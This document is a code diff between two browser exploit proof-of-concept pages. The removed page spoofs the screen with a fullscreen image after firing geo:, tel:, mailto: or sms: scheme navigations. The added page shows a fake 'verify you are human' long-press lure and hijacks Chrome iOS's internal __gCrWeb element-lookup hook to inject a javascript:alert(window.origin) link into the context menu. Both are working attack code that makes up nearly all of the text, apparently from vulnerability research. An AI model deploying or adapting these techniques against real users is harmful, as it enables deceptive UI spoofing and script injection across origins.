@@ -1,191 +1,57 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
-    />
-    <title>tester-diag-nav-geo</title>
-    <style>
-      html,
-      body {
-        margin: 0;
-        padding: 0;
-        width: 100%;
-        height: 100%;
-        overflow: hidden;
-        overscroll-behavior: none;
-        touch-action: none;
-        background: #fff;
-        text-align: center;
-        font-family: sans-serif;
-      }
-      #spoof {
-        display: none;
-        position: fixed;
-        inset: 0;
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        transform: translateZ(0);
-        backface-visibility: hidden;
-        user-select: none;
-        -webkit-user-select: none;
-        pointer-events: none;
-      }
-      #bait {
-        position: fixed;
-        inset: 0;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        gap: 12px;
-      }
-      #overlay {
-        display: none;
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.35);
-        align-items: center;
-        justify-content: center;
-        z-index: 10;
-      }
-      #overlay.show {
-        display: flex;
-      }
-      #overlayInput {
-        padding: 10px 14px;
-        font-size: 16px;
-        border: 2px solid #222;
-        background: #fff;
-      }
-      select,
-      button {
-        padding: 12px 20px;
-        font-size: 16px;
-        cursor: pointer;
-        touch-action: manipulation;
-      }
-    </style>
-  </head>
+<!DOCTYPE html>
+<html>
   <body>
-    <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />
+    <img style="display:block;margin:0 auto;" width="85px;" src="https://www.google.com/favicon.ico">
 
-    <div id="bait">
-      <h2>Fast Navigation &amp; Fullscreen Diag</h2>
-      <label for="schemeSelect">Target URI:</label>
-      <select id="schemeSelect">
-        <option value="geo:0,0?q=test">geo: (geo:0,0?q=test)</option>
-        <option value="tel:000000">tel: (tel:000000)</option>
-        <option value="mailto:test@example.invalid">mailto: (mailto:test@example.invalid)</option>
-        <option value="sms:000000">sms: (sms:000000)</option>
-      </select>
+    <img width="500px;" style="border:1px solid #000000; display:block;margin:200px auto;" src="https://i.imgur.com/1fDGQky.jpg?1">
 
-      <label for="modeSelect">Dispatch Mode:</label>
-      <select id="modeSelect">
-        <option value="location">location.assign (fast nav)</option>
-        <option value="iframe">hidden iframe</option>
-      </select>
+    <script type="text/javascript">
 
-      <button id="btn">run test</button>
-    </div>
+      alert("Hold finger on page and press Open to verify you are human.");
+      function redirect() {
+        document.location = "https://www.google.com/favicon.ico";
+      }
 
-    <div id="overlay" aria-hidden="true">
-      <input id="overlayInput" type="text" placeholder="diag focus target" />
-    </div>
-
-    <script>
-      const docEl = document.documentElement;
-      const reqFS =
-        docEl.requestFullscreen ||
-        docEl.webkitRequestFullscreen ||
-        docEl.mozRequestFullScreen ||
-        docEl.msRequestFullscreen;
-
-      const btn = document.getElementById("btn");
-      const schemeSelect = document.getElementById("schemeSelect");
-      const modeSelect = document.getElementById("modeSelect");
-      const bait = document.getElementById("bait");
-      const spoof = document.getElementById("spoof");
-      const overlay = document.getElementById("overlay");
-      const overlayInput = document.getElementById("overlayInput");
-
-      const logEvent = (label, extra = "") => {
-        const ts = performance.now().toFixed(2);
-        const active = navigator.userActivation?.isActive ?? "n/a";
-        console.info(`[PoC +${ts}ms | act=${active}] ${label}`, extra);
-      };
-
-      const triggerScheme = (uri, mode) => {
-        if (mode === "location") {
-          window.location.assign(uri);
-          logEvent("location.assign invoked", uri);
-          return;
-        }
-        const frame = document.createElement("iframe");
-        frame.style.display = "none";
-        frame.src = uri;
-        document.body.appendChild(frame);
-        logEvent("scheme iframe appended", uri);
-      };
-
-      document.addEventListener("fullscreenchange", () => {
-        logEvent("fullscreenchange", `activeElement=${document.fullscreenElement?.id || "none"}`);
-      });
-
-      document.addEventListener("fullscreenerror", (err) => {
-        logEvent("fullscreenerror", err?.type || "unknown");
-      });
-
-      document.addEventListener("visibilitychange", () => {
-        logEvent("visibilitychange", `visibilityState=${document.visibilityState}`);
-      });
-
-      window.addEventListener("blur", () => {
-        logEvent("window blur");
-      });
-
-      window.addEventListener("focus", () => {
-        logEvent("window focus");
-      });
-
-      btn.addEventListener("click", () => {
-        const chosenUri = schemeSelect.value;
-        const chosenMode = modeSelect.value;
-        logEvent("click received", `mode=${chosenMode} uri=${chosenUri}`);
-
-        // Panggil navigasi skema seawal mungkin pada handler klik
-        triggerScheme(chosenUri, chosenMode);
-
-        bait.style.display = "none";
-        spoof.style.display = "block";
-        logEvent("dom visibility toggled");
-
-        setTimeout(() => {
-          logEvent("timeout 300ms fired");
-
-          if (typeof reqFS === "function") {
-            const result = reqFS.call(docEl);
-            if (result && typeof result.catch === "function") {
-              result
-                .then(() => logEvent("requestFullscreen resolved"))
-                .catch((err) =>
-                  logEvent("requestFullscreen rejected", err?.message || String(err))
-                );
-            } else {
-              logEvent("requestFullscreen invoked (non-promise)");
-            }
-          } else {
-            logEvent("requestFullscreen unsupported");
+      var onlongtouch; 
+      var timer;
+      var touchduration = 1000;
+      
+      function touchstart(e) {
+          if (!timer) {
+              timer = setTimeout(redirect, touchduration);
           }
+      }
 
-          overlay.classList.add("show");
-          overlayInput.focus();
-          logEvent("overlay shown & input focused", `active=${document.activeElement?.id || "none"}`);
-        }, 300);
+      function touchend() {
+          //stops short touches from firing the event
+          if (timer) {
+              clearTimeout(timer);
+              timer = null;
+          }
+      }
+
+      function findElementHook(requestId, x, y) { 
+        console.log(requestId)
+        window.webkit.messageHandlers.FindElementResultHandler.postMessage({
+          "requestId": requestId,
+          "referrerPolicy": "default",
+          "src": "javascript:alert(window.origin)",
+          "href": "javascript:alert(window.origin)",
+          "innerText": "magic awaits within",
+          "title": "Press Open to Verify"
+        })
+      }
+
+      function setHook() {
+        __gCrWeb['findElementAtPointInPageCoordinates'] = findElementHook
+      }
+
+      document.addEventListener("DOMContentLoaded", function(event) { 
+          window.addEventListener("touchstart", touchstart, false);
+          window.addEventListener("touchend", touchend, false);
       });
+
+      setTimeout(setHook, 300);
     </script>
   </body>
 </html>
